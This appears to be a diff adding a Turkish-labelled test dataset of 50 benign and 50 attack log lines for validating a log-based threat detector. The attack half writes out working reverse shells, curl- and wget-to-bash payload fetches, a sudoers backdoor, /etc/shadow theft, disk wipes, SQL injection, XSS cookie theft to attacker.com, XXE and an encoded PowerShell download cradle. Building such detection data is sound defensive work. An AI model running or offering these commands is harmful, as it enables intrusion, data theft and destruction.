@@ -1,0 +1,107 @@
+# ==============================================================================
+# 100 ADET DOĞRULAMA LOG TEST VERİSETİ (50 GÜVENLİ + 50 SALDIRI)
+# ==============================================================================
+
+--- [50 GÜVENLİ SİSTEM / KULLANICI LOGU] ---
+[SAFE_01] systemd[1]: Started User Manager for UID 1000.
+[SAFE_02] systemd[1]: Created slice User Slice of UID 1000.
+[SAFE_03] CRON[14210]: (root) CMD (/usr/bin/updatedb)
+[SAFE_04] CRON[14211]: (root) CMD (/usr/local/bin/backup_database.sh > /dev/null 2>&1)
+[SAFE_05] kernel: [   12.450123] EXT4-fs (sda1): mounted filesystem with ordered data mode.
+[SAFE_06] kernel: [   15.890120] e1000: eth0 NIC Link is Up 1000 Mbps Full Duplex
+[SAFE_07] Accepted publickey for deployer from 192.168.1.15 port 52344 ssh2: RSA SHA256:abc123xyz
+[SAFE_08] Accepted password for developer from 192.168.1.20 port 58912 ssh2
+[SAFE_09] Disconnected from user developer 192.168.1.20 port 58912
+[SAFE_10] session opened for user admin by (uid=0)
+[SAFE_11] session closed for user admin
+[SAFE_12] sudo: developer : TTY=pts/0 ; PWD=/home/developer/app ; USER=root ; COMMAND=/bin/systemctl restart nginx
+[SAFE_13] sudo: deployer : TTY=pts/1 ; PWD=/opt/deploy ; USER=root ; COMMAND=/usr/bin/docker compose up -d
+[SAFE_14] apt-get: [19201] [INFO] Upgraded package python3-pip to version 24.0
+[SAFE_15] dpkg: status installed libssl-dev:amd64 3.0.13-0ubuntu3.4
+[SAFE_16] nginx: 192.168.1.50 - - [14/Aug/2026:14:20:10 +0000] "GET /index.html HTTP/1.1" 200 4520 "-" "Mozilla/5.0"
+[SAFE_17] nginx: 192.168.1.50 - - [14/Aug/2026:14:20:12 +0000] "GET /static/css/main.css HTTP/1.1" 200 12500 "-" "Mozilla/5.0"
+[SAFE_18] nginx: 192.168.1.52 - - [14/Aug/2026:14:20:15 +0000] "POST /api/v1/auth/login HTTP/1.1" 200 120 "-" "AppClient/1.0"
+[SAFE_19] sshd[19302]: pam_unix(sshd:session): session opened for user git by (uid=0)
+[SAFE_20] sshd[19302]: pam_unix(sshd:session): session closed for user git
+[SAFE_21] dockerd[892]: time="2026-08-14T14:21:00Z" level=info msg="Container 8b3c1a2f started"
+[SAFE_22] dockerd[892]: time="2026-08-14T14:21:05Z" level=info msg="Health check passed for redis-server"
+[SAFE_23] postfix/pickup[2210]: 4X9kL80v4Zz12: uid=1000 from=<admin@company.local>
+[SAFE_24] postfix/cleanup[2215]: 4X9kL80v4Zz12: message-id=<20260814142100@company.local>
+[SAFE_25] postfix/qmgr[2218]: 4X9kL80v4Zz12: from=<admin@company.local>, size=850, nrcpt=1 (queue active)
+[SAFE_26] postfix/smtp[2220]: 4X9kL80v4Zz12: to=<ops@company.local>, relay=mail.company.local[192.168.1.5]:25, dsn=2.0.0, status=sent
+[SAFE_27] named[905]: client @0x7f8a9c 192.168.1.10#53210 (github.com): query: github.com IN A + (192.168.1.1)
+[SAFE_28] named[905]: client @0x7f8a9c 192.168.1.10#53211 (registry.npmjs.org): query: registry.npmjs.org IN A + (192.168.1.1)
+[SAFE_29] chronyd[750]: Selected source 192.168.1.254 (ntp.local)
+[SAFE_30] chronyd[750]: System clock synchronized with NTP server (offset -0.000124s)
+[SAFE_31] user_cmd: dev1 : git status
+[SAFE_32] user_cmd: dev1 : git pull origin main
+[SAFE_33] user_cmd: dev1 : npm install
+[SAFE_34] user_cmd: dev1 : npm run build
+[SAFE_35] user_cmd: dev1 : python3 main.py --config=prod.json
+[SAFE_36] user_cmd: dev1 : ls -lah /var/log/
+[SAFE_37] user_cmd: dev1 : cd /opt/services/backend && cat README.md
+[SAFE_38] user_cmd: dev1 : tail -n 50 /var/log/syslog
+[SAFE_39] user_cmd: dev1 : htop
+[SAFE_40] user_cmd: dev1 : df -h
+[SAFE_41] ufw: [UFW ALLOW] IN=eth0 OUT= SRC=192.168.1.10 DST=192.168.1.100 PROTO=TCP SPT=54321 DPT=22
+[SAFE_42] ufw: [UFW ALLOW] IN=eth0 OUT= SRC=192.168.1.10 DST=192.168.1.100 PROTO=TCP SPT=54322 DPT=443
+[SAFE_43] systemd-resolved[600]: Using degraded feature set UDP instead of TCP for DNS server 1.1.1.1
+[SAFE_44] kernel: [  105.120930] audit: type=1305 audit(1723645200.123:45): audit_pid=850 state=1
+[SAFE_45] rsyslogd: [origin software="rsyslogd" swVersion="8.2310.0"] restart
+[SAFE_46] dbus-daemon[720]: [system] Successfully activated service 'org.freedesktop.PackageKit'
+[SAFE_47] kernel: [  210.450190] usb 1-1: new high-speed USB device number 3 using xhci_hcd
+[SAFE_48] Failed password for user developer from 192.168.1.20 port 58912 ssh2
+[SAFE_49] gnome-shell[1500]: Window manager warning: Buggy client sent a _NET_ACTIVE_WINDOW message
+[SAFE_50] systemd[1]: Reached target Graphical Interface.
+
+--- [50 RİSKLİ / SALDIRI LOGU] ---
+[ATTACK_01] bash -i >& /dev/tcp/185.220.101.5/4444 0>&1
+[ATTACK_02] /bin/nc.traditional -e /bin/bash 194.26.29.112 1337
+[ATTACK_03] ncat -e /bin/sh 193.142.146.88 9001
+[ATTACK_04] python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("185.220.101.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+[ATTACK_05] socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:198.51.100.20:443
+[ATTACK_06] sudo LD_PRELOAD=/tmp/librootkit.so /bin/sh
+[ATTACK_07] export LD_LIBRARY_PATH=/tmp/injected_libs:$LD_LIBRARY_PATH && /usr/bin/passwd
+[ATTACK_08] chmod 4777 /tmp/backdoor_root_shell
+[ATTACK_09] chmod +s /bin/bash
+[ATTACK_10] echo 'hacker ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
+[ATTACK_11] cat /etc/shadow > /tmp/stolen_shadow.txt
+[ATTACK_12] dd if=/dev/zero of=/dev/sda bs=1M count=1000
+[ATTACK_13] rm -rf / --no-preserve-root
+[ATTACK_14] curl -s http://evil-c2-server.ru/payload.sh | bash
+[ATTACK_15] wget -qO- https://194.26.29.112/crypto_miner.tar.gz | tar xz && ./miner
+[ATTACK_16] GET /index.php?id=1 UNION SELECT null, username, password, email FROM users-- HTTP/1.1
+[ATTACK_17] POST /login.php HTTP/1.1 - payload: username=admin' OR '1'='1'--&password=x
+[ATTACK_18] GET /search.php?q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script> HTTP/1.1
+[ATTACK_19] POST /api/xml HTTP/1.1 - payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
+[ATTACK_20] GET /download.php?file=../../../../../../etc/passwd HTTP/1.1
+[ATTACK_21] GET /../../../../etc/shadow HTTP/1.1
+[ATTACK_22] eval(gzinflate(base64_decode('H4sICN+76lwCA2hlbGxvLnNoAPNw8/F3dVfITcxLTS5KLcgvLSpNzSsBAK/r9B0YAAAA')))
+[ATTACK_23] powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcAAuAHAAcwAxACcAKQA=
+[ATTACK_24] \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+[ATTACK_25] user_cmd: attacker : ptrace -p 1204 -w /proc/1204/mem
+[ATTACK_26] memfd_create("fileless_malware", MFD_CLOEXEC)
+[ATTACK_27] kernel: process 4120 (exploit_runner) injected shellcode into /proc/890/mem
+[ATTACK_28] Invalid user admin from 194.26.29.112 port 49120
+[ATTACK_29] Invalid user root from 194.26.29.112 port 49121
+[ATTACK_30] Invalid user support from 194.26.29.112 port 49122
+[ATTACK_31] Invalid user oracle from 194.26.29.112 port 49123
+[ATTACK_32] Invalid user test from 194.26.29.112 port 49124
+[ATTACK_33] Failed password for invalid user admin from 194.26.29.112 port 49120 ssh2
+[ATTACK_34] Failed password for invalid user root from 194.26.29.112 port 49121 ssh2
+[ATTACK_35] Failed password for invalid user postgres from 194.26.29.112 port 49122 ssh2
+[ATTACK_36] error: maximum authentication attempts exceeded for root from 194.26.29.112 port 49125
+[ATTACK_37] [UFW BLOCK] IN=eth0 OUT= SRC=185.220.101.5 DST=192.168.1.100 PROTO=TCP DPT=80 WINDOW=0
+[ATTACK_38] [UFW BLOCK] IN=eth0 OUT= SRC=185.220.101.5 DST=192.168.1.100 PROTO=TCP FLAGS=FIN PSH URG
+[ATTACK_39] Masscan connection attempt from 198.51.100.99 across ports 1-65535
+[ATTACK_40] ZMap network scan probe detected from 198.51.100.88
+[ATTACK_41] custom TCP raw packet injection from 198.51.100.77 (Hping3 probe)
+[ATTACK_42] device eth0 entered promiscuous mode
+[ATTACK_43] arp: hardware address changed for 192.168.1.1 from 00:11:22:33:44:55 to de:ad:be:ef:00:01 (ARP Spoofing)
+[ATTACK_44] Tor exit node connection established from 185.220.101.5 to internal port 22
+[ATTACK_45] DNS TXT query length > 200 bytes from 194.26.29.112 (DNS Data Exfiltration Tunnel)
+[ATTACK_46] ICMP echo payload size > 1000 bytes from 194.26.29.112 (ICMP Tunneling Probe)
+[ATTACK_47] vsftpd: FAIL LOGIN: Client "194.26.29.112" attempted brute force password spray
+[ATTACK_48] named: query ANY (DNS Amplification Attack Vector) from 194.26.29.112
+[ATTACK_49] user management updated /etc/shadow for unauthorized user 'backdoor_admin'
+[ATTACK_50] IPv4: martian source 192.168.1.1 from 203.0.113.5 (IP Spoofing Martian Attack)
